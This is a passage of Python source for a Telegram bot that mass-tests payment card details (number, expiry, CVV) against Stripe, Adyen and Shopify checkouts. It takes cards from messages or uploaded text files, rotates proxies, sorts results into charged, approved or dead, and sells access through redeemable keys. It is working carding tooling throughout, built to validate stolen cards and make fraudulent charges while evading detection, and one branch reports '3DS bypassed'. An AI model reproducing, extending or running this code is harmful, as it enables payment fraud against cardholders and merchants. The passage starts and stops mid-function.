            await _post_gc_log(result, cname)
    except Exception as e:
        await smsg.edit(pe(f"❌ <b>Check Failed</b>\n<b>{SEP}</b>\n⚠️ Error: <code>{e}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/ady\s+'))
async def adyen_direct_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
        return

    if not get_user_proxies(uid):
        await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
        return

    if adyen_engine is None:
        await event.reply(pe(f"❌ <b>Adyen engine not loaded</b>\n<b>{SEP}</b>\nPlace <code>adyen_engine.py</code> next to the bot."), parse_mode='html')
        return
    parts = event.message.text.split(' ', 2)
    if len(parts) < 3:
        await event.reply(pe(f"❌ <b>Usage</b>\n<b>{SEP}</b>\n<code>/ady LINK card|mm|yy|cvv</code>"), parse_mode='html')
        return
    link = parts[1].strip()
    cc   = extract_cc(parts[2].strip())
    if not cc:
        await event.reply(pe(f"❌ <b>Invalid Card Format</b>"), parse_mode='html')
        return
    card = cc[0]
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not proxies:
        await event.reply(pe(f"❌ <b>No Proxy Configured</b>"), parse_mode='html')
        return
    smsg = await event.reply(pe(
        f"⚡ <b>Adyen Check...</b>\n"
        f"<b>{SEP}</b>\n"
        f"🔗 <code>{link}</code>\n"
        f"🃏 <tg-spoiler><code>{card}</code></tg-spoiler>\n"
        f"⏳ Please wait..."
    ), parse_mode='html')
    try:
        t0 = time.time()
        (result, bin_info), (name, username) = await asyncio.gather(
            asyncio.gather(
                adyen_engine.run_check(link, card, random.choice(proxies)),
                get_bin_info(card.split('|')[0]),
            ),
            get_user_info(uid),
        )
        cname          = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)
        resp = build_result_card(result, bin_info, uid, cname)
        await raw_edit(uid, smsg.id, resp, [])
        if result.get('status') == 'Charged':
            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
        if _should_post_to_gc(result):
            await _post_gc_log(result, cname)
    except Exception as e:
        await smsg.edit(pe(f"❌ <b>Adyen Failed</b>\n<b>{SEP}</b>\n⚠️ <code>{e}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/hit(\s|$)'))
async def hit_command(event):
    uid = event.sender_id

    if not is_premium(uid):
        await event.reply(pe(
            f"❌ <b>Access Denied</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔒 Redeem a key to unlock.\n"
            f"<code>/redeem YOUR-KEY</code>\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
        return

    if hit_api is None:
        await event.reply(pe(
            f"❌ <b>Stripe checker not loaded</b>\n"
            f"<b>{SEP}</b>\n"
            f"Place <code>hit.py</code> next to the bot.\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
        return

    body = event.message.text.split(' ', 1)[1] if ' ' in event.message.text else ''

    url_match = re.search(r'https?://\S+', body)
    if not url_match:
        await event.reply(pe(
            f"❌ <b>Usage</b>\n"
            f"<b>{SEP}</b>\n"
            f"<code>/hit STRIPE_LINK card|mm|yy|cvv</code>\n"
            f"<b>{SEP}</b>\n"
            f"💡 Stripe links look like:\n"
            f"<code>checkout.stripe.com/c/pay/cs_live_...</code>\n"
            f"<code>checkout.stripe.com/f/pay/cs_live_...</code>\n"
            f"<code>billing.stripe.com/p/session/live_.../flow</code>\n"
            f"<code>invoice.stripe.com/i/acct_.../live_...</code>\n"
            f"<b>{SEP}</b>\n"
            f"💡 Up to {HIT_MAX_CCS} cards per command (one per line)"
        ), parse_mode='html')
        return

    link = url_match.group(0).rstrip('.,;')

    all_cards = extract_cc(body)
    if not all_cards:
        await event.reply(pe(
            f"❌ <b>No Valid Cards</b>\n"
            f"<b>{SEP}</b>\n"
            f"Expected: <code>card|mm|yy|cvv</code>\n"
            f"One card per line, up to {HIT_MAX_CCS} cards."
        ), parse_mode='html')
        return

    skipped = 0
    if len(all_cards) > HIT_MAX_CCS:
        skipped = len(all_cards) - HIT_MAX_CCS
        all_cards = all_cards[:HIT_MAX_CCS]

    total = len(all_cards)
    smsg = await event.reply(pe(
        f"⚡ <b>Stripe Check  —  Starting</b>\n"
        f"<b>{SEP}</b>\n"
        f"🔗 <code>{link[:70]}{'...' if len(link)>70 else ''}</code>\n"
        f"🃏 <b>Cards:</b> {total}\n"
        f"<b>{SEP}</b>\n"
        f"⏳ Running {total} card(s)..."
    ), parse_mode='html')

    name, username = await get_user_info(uid)
    cname = name if username else str(uid)

    charged = 0
    approved = 0
    dead = 0

    for idx, card in enumerate(all_cards, 1):
        try:
            try:
                await smsg.edit(pe(
                    f"⚡ <b>Stripe Check  —  Running</b>\n"
                    f"<b>{SEP}</b>\n"
                    f"🔗 <code>{link[:70]}{'...' if len(link)>70 else ''}</code>\n"
                    f"📋 <b>Progress:</b> {idx}/{total}\n"
                    f"<code>{make_progress_bar(idx-1, total)}</code>\n"
                    f"🃏 <tg-spoiler>{card}</tg-spoiler>"
                ), parse_mode='html')
            except Exception:
                pass

            t0 = time.time()
            raw = await asyncio.to_thread(hit_api.run_hit_check, link, card)
            try:
                bin_info = await get_bin_info(card.split('|')[0][:6])
            except Exception:
                bin_info = ("-", "-", "-", "-", "-", "")

            if not raw.get("ok"):
                err = raw.get("error") or "Check failed"
                result = _make_result(
                    card, "Dead",
                    message=err,
                    gateway="Stripe (ravenxkiller)",
                    retryable=False,
                )
            else:
                rstat = (raw.get("result_status") or "").lower()
                rmsg  = raw.get("result_msg") or "Unknown"
                price = raw.get("price_display") or "-"
                if rstat in ("charge", "charged"):
                    result = _make_result(
                        card, "Charged",
                        message=rmsg, price=price,
                        gateway="Stripe (ravenxkiller)",
                        receipt_url=raw.get("success_url") or "",
                        retryable=False,
                    )
                    charged += 1
                elif rstat in ("live", "approved"):
                    result = _make_result(
                        card, "Approved",
                        message=rmsg, price=price,
                        gateway="Stripe (ravenxkiller)",
                        retryable=False,
                    )
                    approved += 1
                else:
                    if raw.get("3d_bypassed"):
                        rmsg = f"{rmsg} (3DS bypassed)"
                    result = _make_result(
                        card, "Dead",
                        message=rmsg, price=price,
                        gateway="Stripe (ravenxkiller)",
                        retryable=False,
                    )
                    dead += 1
            result['time'] = round(time.time() - t0, 2)

            card_msg = build_result_card(result, bin_info, uid, cname)
            try:
                await raw_send(uid, card_msg, [])
            except Exception:
                pass

            if _should_post_to_gc(result):
                await _post_gc_log(result, cname)

            if result.get('status') == 'Charged':
                try:
                    await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
                except Exception:
                    pass

        except Exception as e:
            dead += 1
            try:
                await raw_send(uid, pe(
                    f"❌ <b>Card Error</b>\n"
                    f"<b>{SEP}</b>\n"
                    f"🃏 <code>{card}</code>\n"
                    f"⚠️ <code>{str(e)[:120]}</code>"
                ), [])
            except Exception:
                pass

    skip_note = f"\n⚠️ {skipped} card(s) skipped (max {HIT_MAX_CCS})" if skipped else ""
    try:
        await smsg.edit(pe(
            f"✅ <b>Stripe Check  —  Complete</b>\n"
            f"<b>{SEP}</b>\n"
            f"📋 <b>Total</b>    »  {total}\n"
            f"💎 <b>Charged</b>  »  {charged}\n"
            f"✅ <b>Approved</b> »  {approved}\n"
            f"❌ <b>Dead</b>     »  {dead}"
            f"{skip_note}\n"
            f"<b>{SEP}</b>\n"
            f"{checker_line(uid, cname)}\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern=r'^/key(\s+.*)?$'))
async def key_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    parts = event.message.text.strip().split()
    if len(parts) < 4:
        await event.reply(pe(
            f"🔑 <b>Key Generator</b>\n"
            f"<b>{SEP}</b>\n"
            f"Usage: <code>/key &lt;count&gt; &lt;hours&gt; &lt;max_users&gt;</code>\n"
            f"Example: <code>/key 1 12 40</code>\n"
            f"→ 1 key, 12h access, 40 users max"
        ), parse_mode='html')
        return
    try:
        count     = max(1, min(int(parts[1]), 50))
        hours     = max(1, min(int(parts[2]), 24 * 365))
        max_users = max(1, min(int(parts[3]), 10000))
    except ValueError:
        await event.reply(pe(f"❌ <b>Numbers only</b>"), parse_mode='html')
        return

    made = []
    for _ in range(count):
        key = _gen_key_code()
        while key in _keys_cache:
            key = _gen_key_code()
        _keys_cache[key] = {
            'created_by':     uid,
            'created_at':     int(time.time()),
            'duration_hours': hours,
            'max_users':      max_users,
            'used_by':        [],
        }
        made.append(key)
    _save_keys()

    line = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
    for k in made:
        text = pe(
            f"[⌯] {_sb('Key')} ⌁ {_sb('Generated')} ⌁ ⚡\n"
            f"\n"
            f"{line}\n"
            f"[⌯] {_sb('Key')} ⌁ <code>{k}</code>\n"
            f"[⌯] {_sb('Plan')} ⌁ {_sb(str(hours) + 'h')} ⌁ ⚡\n"
            f"[⌯] {_sb('Duration')} ⌁ {_sb(str(hours) + 'h')} ⌁ ⚡\n"
            f"[⌯] {_sb('Max Uses')} ⌁ {_sb(str(max_users))} ⌁ ⚡\n"
            f"\n"
            f"{line}\n"
            f"[⌯] {_sb('Redeem')} ⌁ /redeem {k} in @TheHitterBot ⌁ ⚡"
        )
        await event.reply(text, parse_mode='html')
        await asyncio.sleep(0.3)

@bot.on(events.NewMessage(pattern=r'^/redeem\s+(\S+)$'))
async def redeem_command(event):
    uid = event.sender_id
    key = event.message.text.split(' ', 1)[1].strip().upper()
    if is_admin(uid):
        await event.reply(pe(f"⚠️ <b>Already Admin</b>"), parse_mode='html')
        return
    if is_premium(uid):
        await event.reply(pe(f"⚠️ <b>Already Activated</b>\n<b>{SEP}</b>\nYou already have access."), parse_mode='html')
        return
    _load_keys()
    entry = _keys_cache.get(key)
    if not entry:
        await event.reply(pe(f"❌ <b>Invalid Key</b>\n<b>{SEP}</b>\n<code>{key}</code> not found."), parse_mode='html')
        return
    users = entry.get('used_by', [])
    used_ids = set()
    for u in users:
        if isinstance(u, dict):
            used_ids.add(u.get('id'))
        else:
            used_ids.add(u)
    if uid in used_ids:
        await event.reply(pe(f"⚠️ <b>Already Redeemed</b>\n<b>{SEP}</b>\nYou already used this key."), parse_mode='html')
        return
    if len(users) >= int(entry.get('max_users', 1)):
        await event.reply(pe(f"❌ <b>Key Fully Redeemed</b>\n<b>{SEP}</b>\nThis key reached its max users."), parse_mode='html')
        return
    hours = int(entry.get('duration_hours', 24))

    try:
        sender = await event.get_sender()
        uname = sender.username or ''
        fname = sender.first_name or ''
    except Exception:
        uname, fname = '', ''

    users.append({'id': uid, 'username': uname, 'first_name': fname, 'at': int(time.time())})
    entry['used_by'] = users
    _save_keys()

    _grant_access(uid, hours, key, username=uname, first_name=fname)
    await event.reply(pe(
        f"✅ <b>Access Granted</b>\n"
        f"<b>{SEP}</b>\n"
        f"🔑 <b>Key</b>     »  <code>{key}</code>\n"
        f"⏰ <b>Duration</b> »  {hours}h\n"
        f"👤 <b>User</b>     »  <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"Use <code>/sh</code> for single checks\n"
        f"Send a <code>.txt</code> file for mass checks\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listkeys$'))
async def listkeys_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    _load_keys()
    if not _keys_cache:
        await event.reply(pe(f"📋 <b>No keys generated yet.</b>"), parse_mode='html')
        return
    lines = []
    for k, v in list(_keys_cache.items())[:20]:
        used  = len(v.get('used_by', []))
        maxu  = v.get('max_users', 1)
        hours = v.get('duration_hours', 24)
        lines.append(f"🔑 <code>{k}</code> — {hours}h · {used}/{maxu}")
    extra = f"\n<i>+{len(_keys_cache)-20} more</i>" if len(_keys_cache) > 20 else ""
    await event.reply(pe(
        f"📋 <b>Key List  ({len(_keys_cache)})</b>\n"
        f"<b>{SEP}</b>\n"
        + "\n".join(lines)
        + extra
        + f"\n<b>{SEP}</b>\n"
        f"Delete: <code>/revokey KEY</code>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/revokey\s+(\S+)$'))
async def revokey_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    key = event.message.text.split(' ', 1)[1].strip().upper()
    _load_keys()
    if key not in _keys_cache:
        await event.reply(pe(f"❌ <b>Key not found.</b>"), parse_mode='html')
        return
    del _keys_cache[key]
    _save_keys()
    await event.reply(pe(f"🗑️ <b>Key Revoked</b>\n<b>{SEP}</b>\n<code>{key}</code> removed."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/setproxy(\s+[\s\S]+)?$'))
async def setproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    content = event.message.text[len('/setproxy'):].strip()
    if not content:
        user_list = get_user_proxy_list(uid)
        if user_list:
            listed = "\n".join(f"  <code>{p}</code>" for p in user_list[:10])
            extra  = f"\n  <i>+{len(user_list)-10} more</i>" if len(user_list) > 10 else ""
            await event.reply(pe(
                f"🔌 <b>Your Proxies  ({len(user_list)})</b>\n"
                f"<b>{SEP}</b>\n{listed}{extra}\n"
                f"<b>{SEP}</b>\n"
                f"Replace: <code>/setproxy ip:port</code>\n"
                f"Clear:   <code>/clearuserproxy</code>"
            ), parse_mode='html')
        else:
            await event.reply(pe(
                f"🔌 <b>Set Your Proxy</b>\n"
                f"<b>{SEP}</b>\n"
                f"<b>Single:</b>\n"
                f"<code>/setproxy ip:port</code>\n"
                f"<code>/setproxy ip:port:user:pass</code>\n\n"
                f"<b>Multiple (one per line):</b>\n"
                f"<code>/setproxy\nip:port\nip:port:user:pass</code>"
            ), parse_mode='html')
        return
    if helpers is not None and hasattr(helpers, 'split_concatenated_proxies'):
        lines = helpers.split_concatenated_proxies(content)
    else:
        lines = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
    new_proxies = lines
    set_user_proxies(uid, new_proxies)
    count = len(new_proxies)
    await event.reply(pe(
        f"✅ <b>Proxy {'Set' if count == 1 else 'Updated'}</b>\n"
        f"<b>{SEP}</b>\n"
        f"📡 <b>Active:</b> {count} {'proxy' if count == 1 else 'proxies'}\n"
        f"🔁 Rotating per card automatically\n"
        f"<b>{SEP}</b>\n"
        f"Test: <code>/chkproxy {new_proxies[0]}</code>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clearuserproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    remove_user_proxy(uid)
    await event.reply(pe(f"✅ <b>Proxy Cleared</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite(\s+[\s\S]+)?$'))
async def addsite_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return

    raw_text = ''
    replied = await event.get_reply_message()
    if replied and replied.file:
        name = (replied.file.name or '')
        if name.lower().endswith('.txt'):
            try:
                fp = await replied.download_media()
                if fp:
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        raw_text = f.read()
                    try: os.remove(fp)
                    except: pass
            except Exception:
                await event.reply(pe(f"❌ <b>File download failed.</b>\n<b>{SEP}</b>\nForwarded files from other bots may not be downloadable."), parse_mode='html')
                return

    text_part = event.message.text[len('/addsite'):].strip()
    if text_part:
        raw_text = text_part + '\n' + raw_text if raw_text else text_part

    if not raw_text.strip():
        await event.reply(pe(
            f"❌ <b>Usage</b>\n"
            f"<b>{SEP}</b>\n"
            f"<code>/addsite https://store.myshopify.com</code>\n"
            f"<code>/addsite https://custom-domain.com</code>\n"
            f"Or reply to a <code>.txt</code> file with <code>/addsite</code>\n"
            f"<b>{SEP}</b>\n"
            f"✅ Accepts both <code>*.myshopify.com</code> and custom domains"
        ), parse_mode='html')
        return

    candidates = [l.strip() for l in raw_text.splitlines() if l.strip()]
    urls = []
    for u in candidates:
        if not u.startswith('http'):
            continue
        if _is_valid_url(u):
            urls.append(u)
    skipped = len(candidates) - len(urls)

    if not urls:
        await event.reply(pe(
            f"❌ <b>No valid URLs found</b>\n"
            f"<b>{SEP}</b>\n"
            f"Each line must be a full URL starting with <code>http</code>\n"
            f"Example: <code>https://store.myshopify.com</code>"
        ), parse_mode='html')
        return

    added = add_user_sites(uid, urls)
    total = len(get_user_sites(uid))
    skip_note = f"\n⚠️ Skipped: {skipped} invalid line(s)" if skipped else ""
    await event.reply(pe(
        f"✅ <b>Sites Added</b>\n"
        f"<b>{SEP}</b>\n"
        f"➕ <b>Added</b>     »  {added}\n"
        f"📋 <b>Your Pool</b> »  {total}{skip_note}\n"
        f"<b>{SEP}</b>\n"
        f"Your checks will use these sites.\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxies$'))
async def addproxies_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return

    replied = await event.get_reply_message()
    if not replied or not replied.file:
        await event.reply(pe(
            f"❌ <b>Reply to a .txt file</b>\n"
            f"<b>{SEP}</b>\n"
            f"Send a .txt with one proxy per line, then reply with <code>/addproxies</code>"
        ), parse_mode='html')
        return

    name = (replied.file.name or '')
    if not name.lower().endswith('.txt'):
        await event.reply(pe(f"❌ <b>Not a .txt file</b>"), parse_mode='html')
        return

    try:
        fp = await replied.download_media()
        if not fp:
            raise ValueError("download returned None")
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.read()
        try: os.remove(fp)
        except: pass
    except Exception:
        await event.reply(pe(f"❌ <b>File download failed.</b>\n<b>{SEP}</b>\nForwarded files from other bots may not be downloadable."), parse_mode='html')
        return

    if helpers is not None and hasattr(helpers, 'split_concatenated_proxies'):
        lines = helpers.split_concatenated_proxies(raw)
    else:
        lines = [l.strip() for l in raw.splitlines() if l.strip()]

    parsed = []
    for ln in lines:
        p = helpers.parse_proxy_format(ln) if helpers else None
        if p:
            parsed.append(p)

    if not parsed:
        await event.reply(pe(f"❌ <b>No valid proxies in file</b>"), parse_mode='html')
        return

    smsg = await event.reply(pe(
        f"⚡ <b>Testing {len(parsed)} proxies...</b>\n"
        f"<b>{SEP}</b>\n"
        f"⏳ This may take a moment"
    ), parse_mode='html')

    working = []
    TEST_BATCH = 10
    for i in range(0, len(parsed), TEST_BATCH):
        batch = parsed[i:i+TEST_BATCH]
        results = await asyncio.gather(*[test_proxy_async(p) for p in batch])
        for r in results:
            if r is not None:
                working.append(r)
        try:
            await smsg.edit(pe(
                f"⚡ <b>Testing proxies...</b>\n"
                f"<b>{SEP}</b>\n"
                f"✅ Working: {len(working)}\n"
                f"📋 Tested: {min(i+TEST_BATCH, len(parsed))}/{len(parsed)}"
            ), parse_mode='html')
        except Exception:
            pass

    if not working:
        await smsg.edit(pe(
            f"❌ <b>All proxies dead</b>\n"
            f"<b>{SEP}</b>\n"
            f"Tested: {len(parsed)}"
        ), parse_mode='html')
        return

    existing = set(get_user_proxy_list(uid))
    final = list(existing)
    for p in working:
        raw_str = _proxy_url_to_raw(p)
        if raw_str and raw_str not in existing:
            final.append(raw_str)

    set_user_proxies(uid, final)
    await smsg.edit(pe(
        f"✅ <b>Proxies Added</b>\n"
        f"<b>{SEP}</b>\n"
        f"✅ <b>Working</b>   »  {len(working)}\n"
        f"❌ <b>Dead</b>      »  {len(parsed) - len(working)}\n"
        f"📋 <b>Your Pool</b> »  {len(final)}\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def mysites_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    sites = get_user_sites(uid)
    if not sites:
        await event.reply(pe(
            f"📋 <b>Your Sites</b>\n"
            f"<b>{SEP}</b>\n"
            f"You haven't added any sites yet.\n"
            f"Checks will use the global pool.\n"
            f"<b>{SEP}</b>\n"
            f"Add: <code>/addsite URL</code>\n"
            f"Or reply to a <code>.txt</code> file with <code>/addsite</code>"
        ), parse_mode='html')
        return
    preview = "\n".join(f"  {i+1}. <code>{s}</code>" for i, s in enumerate(sites[:10]))
    more = f"\n  <i>+{len(sites)-10} more</i>" if len(sites) > 10 else ""
    await event.reply(pe(
        f"📋 <b>Your Sites  ({len(sites)})</b>\n"
        f"<b>{SEP}</b>\n"
        f"{preview}{more}\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/reloadsites$'))
async def reloadsites_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    smsg = await event.reply(pe(
        f"⚡ <b>Reloading sites...</b>\n"
        f"<b>{SEP}</b>\n"
        f"📡 Source: GitHub ({GITHUB_REPO or 'not set'})"
    ), parse_mode='html')
    n = await reload_sites()
    await smsg.edit(pe(
        f"✅ <b>Sites Reloaded</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>  »  {n}\n"
        f"🗑️ <b>Dead cache cleared</b>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/sitescount$'))
async def sitescount_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    total = len(load_sites())
    dead  = len(_DEAD_SITES)
    await event.reply(pe(
        f"📊 <b>Sites Status</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total cached</b>  »  {total}\n"
        f"🟢 <b>Live pool</b>     »  {total - dead}\n"
        f"🔴 <b>Dead (session)</b> »  {dead}\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

def _is_txt_file(e):
    if not e.file:
        return False
    name = e.file.name or ''
    mime = e.file.mime_type or ''
    return name.endswith('.txt') or mime in ('text/plain', 'application/octet-stream') and name.endswith('.txt') or (not name and mime == 'text/plain')

@bot.on(events.NewMessage(func=_is_txt_file))
async def txt_detected(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
        return
    if not get_user_proxies(uid):
        await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
        return
    sites   = get_user_sites(uid) or get_live_sites()
    proxies = get_proxies_for_user(uid)
    if not sites:
        await event.reply(pe(f"❌ <b>No Sites Configured</b>"), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(f"❌ <b>No Proxy Configured</b>"), parse_mode='html')
        return
    try:
        fp = await event.message.download_media()
    except Exception:
        fp = None
    if not fp:
        await event.reply(pe(f"❌ <b>File download failed.</b>\n<b>{SEP}</b>\nForwarded files from other bots may not be downloadable.\nTry sending the file directly instead of forwarding."), parse_mode='html')
        return
    try:
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: os.remove(fp)
        except: pass
    except Exception:
        await event.reply(pe(f"❌ <b>File read failed.</b>"), parse_mode='html')
        return
    cards = extract_cc(content)
    if not cards:
        await event.reply(pe(f"❌ <b>No Cards Found</b>"), parse_mode='html')
        return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        await event.reply(pe(f"⚠️ <b>Limit Applied</b>\n<b>{SEP}</b>\nFile: {len(cards)} cards · Limit: <b>{limit}</b>"), parse_mode='html')
        cards = cards[:limit]
    pending_checks[uid] = {'cards': cards}
    preview_lines = "\n".join([f'⭐ <tg-spoiler>{c}</tg-spoiler>' for c in cards[:3]])
    more = f"\n<i>  ...and {len(cards)-3} more</i>" if len(cards) > 3 else ""
    text = pe(
        f"📂 <b>File Detected</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Cards found:</b> <b>{len(cards)}</b>\n"
        f"<b>{SEP}</b>\n"
        f"{preview_lines}{more}\n"
        f"<b>{SEP}</b>\n"
        f"<b>🔥 Tap below to start checking</b>"
    )
    await raw_send(uid, text, [[{"text": "💳  Start Mass Check", "callback_data": f"start_check_{uid}"}]], reply_to=event.message.id)

@bot.on(events.NewMessage(pattern=r'^/msh$'))
async def mass_check_cmd(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
        return

    if not get_user_proxies(uid):
        await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(pe(
            f"⚡ <b>How to Mass Check</b>\n"
            f"<b>{SEP}</b>\n"
            f"Reply to a <code>.txt</code> file with <code>/msh</code>\n"
            f"— or — send a <code>.txt</code> file directly!"
        ), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ <b>Invalid File</b>\n<b>{SEP}</b>\nReply to a valid <code>.txt</code> file."), parse_mode='html')
        return
    sites   = get_user_sites(uid) or get_live_sites()
    proxies = get_proxies_for_user(uid)
    if not sites or not proxies:
        await event.reply(pe(f"❌ <b>No sites/proxies configured</b>"), parse_mode='html')
        return

    try:
        fp = await reply.download_media()
    except Exception as e:
        await event.reply(pe(
            f"❌ <b>File download failed</b>\n"
            f"<b>{SEP}</b>\n"
            f"⚠️ <code>{str(e)[:120]}</code>\n"
            f"<b>{SEP}</b>\n"
            f"💡 Forwarded files from other bots may not be downloadable.\n"
            f"Try sending the file directly instead of forwarding."
        ), parse_mode='html')
        return

    if not fp:
        await event.reply(pe(
            f"❌ <b>File download returned nothing</b>\n"
            f"<b>{SEP}</b>\n"
            f"💡 Try sending the file directly instead of forwarding."
        ), parse_mode='html')
        return

    try:
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: os.remove(fp)
        except: pass
    except Exception as e:
        await event.reply(pe(f"❌ <b>File read failed</b>\n<b>{SEP}</b>\n⚠️ <code>{str(e)[:120]}</code>"), parse_mode='html')
        return

    cards = extract_cc(content)
    if not cards:
        await event.reply(pe(f"❌ <b>No Valid Cards</b>"), parse_mode='html')
        return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
    text = pe(
        f"<b>🔥 Mass Check  —  Starting</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    content = event.message.text[len('/addproxy'):].strip()
    if not content:
        await event.reply(pe(f"📡 <b>Add Proxies</b>\n<b>{SEP}</b>\n<code>/addproxy ip:port</code>\n<code>/addproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    if helpers is not None and hasattr(helpers, 'split_concatenated_proxies'):
        new   = helpers.split_concatenated_proxies(content)
    else:
        new   = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
    curr  = load_proxies()
    added = [p for p in new if p not in curr]
    dups  = len(new) - len(added)
    if not added:
        await event.reply(pe(f"⚠️ <b>All already in pool.</b>"), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in added: await f.write(f"{p}\n")
    dup_note = f"\n⚠️ {dups} duplicate(s) skipped." if dups else ""
    await event.reply(pe(
        f"✅ <b>Pool Updated</b>\n"
        f"<b>{SEP}</b>\n"
        f"📡 <b>Added:</b> {len(added)}{dup_note}\n"
        f"📋 <b>Total:</b> {len(curr)+len(added)}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    curr = load_proxies()
    if not curr:
        await event.reply(pe(f"⚠️ <b>Pool empty.</b>"), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(pe(f"✅ <b>Proxy Pool Cleared</b>\n<b>{SEP}</b>\n🗑️ Removed <b>{len(curr)}</b> proxies."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    msg   = await event.reply(pe(f"⚡ <b>Testing Proxy...</b>\n<b>{SEP}</b>\n<code>{proxy}</code>"), parse_mode='html')
    r        = await test_proxy(proxy)
    is_alive = r.get('status') == 'alive'
    if is_alive:
        ip_info = await get_proxy_ip(proxy)
        await msg.edit(pe(
            f"✅ <b>Proxy  —  Alive</b>\n"
            f"<b>{SEP}</b>\n"
            f"📡 <code>{proxy}</code>\n"
            f"🌐 <b>Exit IP:</b>  <code>{ip_info or 'N/A'}</code>"
        ), parse_mode='html')
    else:
